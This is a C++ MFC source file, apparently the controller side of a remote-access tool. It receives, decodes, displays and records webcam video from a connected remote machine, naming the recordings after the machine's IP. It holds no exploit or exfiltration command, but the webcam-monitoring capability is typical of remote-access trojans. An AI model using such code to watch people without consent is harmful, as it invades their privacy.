// VideoDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "VideoDlg.h"
#include "afxdialogex.h"
#include "IOCPServer.h"
#include "Common.h"


enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// 视频压缩
	IDM_SAVEAVI,					// 保存录像
};

// CVideoDlg 对话框

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

CVideoDlg::CVideoDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_lpCompressDIB	= NULL;
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_pVideoCodec  = NULL;
	m_nCount		= 0;
	m_fccHandler=1129730893;  
	m_aviFile = "";
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";


	ResetScreen();

}



void CVideoDlg::ResetScreen(void)
{
	if (m_lpbmi)
	{
		delete m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpCompressDIB)
	{
		delete m_lpCompressDIB;
		m_lpCompressDIB = NULL;
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;
	}

	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);


	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	memset(&m_MMI, 0, sizeof(MINMAXINFO));

}



CVideoDlg::~CVideoDlg()
{
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CVideoDlg 消息处理程序


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "视频压缩(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存录像(&V)");
		pSysMenu->AppendMenu(MF_SEPARATOR);	
	
		CString str;
	
		str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	
		SetWindowText(str);


	
		InitMMI();

	
		m_hDD = DrawDibOpen();
	
		m_hDC = ::GetDC(m_hWnd);


		BYTE bToken = COMMAND_NEXT;
	
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	}
	
		return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CVideoDlg::OnReceiveComplete(void)
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		{
			DrawDIB();                  //这里是绘图函数，转到他的代码看一下
			break;
		}	
	}
}



void CVideoDlg::SaveAvi(void)
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "视频文件(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = "";
		MessageBox("创建录像文件失败");	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}
}



void CVideoDlg::DrawDIB(void)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;

	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
	{
		// 第一次，没有压缩，说明服务端不支持指定的解码器
		if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
	}

	else // 解码
	{
		////这里缓冲区里的的第二个字符正好是是否视频解码 
		InitCodec(*(LPDWORD)(lpBuffer + 2));     
		if (m_pVideoCodec != NULL)
		{
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
			//这里开始解码，解码后就是同未压缩的一样了 显示到对话框上。 接下来开始视频保存成avi格式
			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		}
	}

	PostMessage(WM_PAINT);

}



void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	//同样的m_pVideoCodec 是CVideoCodec类的对象
	//回到DrawDIB
	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
	{
		delete m_pVideoCodec;
		// 置NULL, 发送时判断是否为NULL来判断是否压缩
		m_pVideoCodec = NULL;
		// 通知服务端不启用压缩
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}	
}




void CVideoDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// 边框的宽度
	int	nBorderWidth = rectClient.left - rectWindow.left;

	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// 调整窗口到远程大小
	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	if (m_lpScreenDIB==NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	LPCTSTR	lpTipsString = "Recording ...";


	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_lpScreenDIB);
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
}


void CVideoDlg::OnClose()
{
	if (m_lpScreenDIB==NULL)
	{
		CDialog::OnClose();
	}
	if (!m_aviFile.IsEmpty())
	{
		SaveAvi();
	}


	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	if (m_lpbmi!=NULL){ 
		delete [] m_lpbmi;
		m_lpbmi=NULL;
	}
	if (m_lpScreenDIB)
	{
		delete [] m_lpScreenDIB;
		m_lpScreenDIB=NULL;
	}
	if (m_lpCompressDIB){
		delete [] m_lpCompressDIB;
		m_lpCompressDIB=NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;
	}
	CDialog::OnClose();
}


void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));


			break;
		}
	case IDM_SAVEAVI:
		{
			SaveAvi();
			break;
		}
	
	}

	CDialog::OnSysCommand(nID, lParam);
}












///////////////////////////////////////////////////////////////////////////////视频记录类
AVISTREAMINFO CBmpToAvi::m_si;

CBmpToAvi::CBmpToAvi()
{
	m_pfile = NULL;
	m_pavi = NULL;
	AVIFileInit();
}

CBmpToAvi::~CBmpToAvi()
{

	AVIFileExit();
}

bool CBmpToAvi::Open( LPCTSTR szFile, LPBITMAPINFO lpbmi )
{
	if (szFile == NULL)
		return false;
	m_nFrames = 0;

	if (AVIFileOpen(&m_pfile, szFile, OF_WRITE | OF_CREATE, NULL))
		return false;

	m_si.fccType = streamtypeVIDEO;
	m_si.fccHandler = BI_RGB;
	m_si.dwScale = 1;
	m_si.dwRate = 5; // 每秒5帧
	SetRect(&m_si.rcFrame, 0, 0, lpbmi->bmiHeader.biWidth, lpbmi->bmiHeader.biHeight);
	m_si.dwSuggestedBufferSize = lpbmi->bmiHeader.biSizeImage;


	if (AVIFileCreateStream(m_pfile, &m_pavi, &m_si))
		return false;


	if (AVIStreamSetFormat(m_pavi, 0, lpbmi, sizeof(BITMAPINFO)) != AVIERR_OK)
		return false;

	return true;
}

bool CBmpToAvi::Write(LPVOID lpBuffer)
{
	if (m_pfile == NULL || m_pavi == NULL)
		return false;

	return AVIStreamWrite(m_pavi, m_nFrames++, 1, lpBuffer, m_si.dwSuggestedBufferSize, AVIIF_KEYFRAME, NULL, NULL) == AVIERR_OK;	
}


void CBmpToAvi::Close()
{
	if (m_pavi)
	{
		AVIStreamRelease(m_pavi);
		m_pavi = NULL;
	}
	if (m_pfile)
	{
		AVIFileRelease(m_pfile);
		m_pfile = NULL;
	}		
}